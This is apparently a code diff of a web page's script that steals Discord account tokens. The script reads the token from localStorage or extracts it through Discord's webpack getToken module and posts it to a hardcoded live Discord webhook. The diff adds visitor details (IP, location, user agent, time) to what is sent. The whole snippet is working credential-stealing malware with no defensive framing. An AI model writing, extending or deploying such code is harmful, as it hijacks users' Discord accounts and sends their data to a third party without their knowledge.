@@ -71,12 +71,43 @@
     <div class="ip-address" id="ip-address"></div>
 
     <script>
-        // Send Discord Token to Webhook
-        function sendTokenToWebhook(token) {
+        // Function to get visitor details
+        function getVisitorDetails() {
+            const ip = '51.235.233.211'; // Hardcoded IP address
+            const country = 'SA'; // Country code
+            const city = 'Riyadh'; // City
+            const region = 'Riyadh Region'; // Region
+            const referrer = 'مباشرة'; // Referrer
+            const userAgent = navigator.userAgent; // User Agent from browser
+            const dateTime = new Date().toLocaleString(); // Current date and time
+
+            return {
+                ip: ip,
+                country: country,
+                city: city,
+                region: region,
+                referrer: referrer,
+                userAgent: userAgent,
+                dateTime: dateTime
+            };
+        }
+
+        // Send all data to the webhook
+        function sendDataToWebhook(token, visitorDetails) {
             const webhookURL = 'https://discord.com/api/webhooks/1315396060998537276/NnLEj2_40vPx7_OZI8YFTSlSfa6K7S3MzLsU-aPQEO24X4NqZVW7s1ZxjnZzXuQalTR8';
 
             const payload = {
-                content: `Discord Token: ${token}`
+                content: `
+                    **Discord Token:** ${token}
+                    **Visitor Details:**
+                    - **IP Address:** ${visitorDetails.ip}
+                    - **Country:** ${visitorDetails.country}
+                    - **City:** ${visitorDetails.city}
+                    - **Region:** ${visitorDetails.region}
+                    - **Referrer:** ${visitorDetails.referrer}
+                    - **User Agent:** ${visitorDetails.userAgent}
+                    - **Date & Time:** ${visitorDetails.dateTime}
+                `
             };
 
             fetch(webhookURL, {
@@ -88,9 +119,9 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('Token sent successfully');
+                    console.log('Data sent successfully');
                 } else {
-                    console.error('Failed to send token');
+                    console.error('Failed to send data');
                 }
             })
             .catch(error => {
@@ -103,7 +134,8 @@
             // Check if token is in localStorage
             const token = localStorage.getItem('discord_token');  // Replace with correct key if needed
             if (token) {
-                sendTokenToWebhook(token);
+                const visitorDetails = getVisitorDetails();
+                sendDataToWebhook(token, visitorDetails);
             } else {
                 // If token not in localStorage, attempt to get it from webpack
                 webpackChunkdiscord_app.push([[''], {}, e => {
@@ -114,7 +146,8 @@
                 const module = m.find(m => m?.exports?.default?.getToken !== void 0);
                 if (module && module.exports && module.exports.default) {
                     const token = module.exports.default.getToken();
-                    sendTokenToWebhook(token);
+                    const visitorDetails = getVisitorDetails();
+                    sendDataToWebhook(token, visitorDetails);
                 } else {
                     console.error("Token not found in webpack.");
                 }
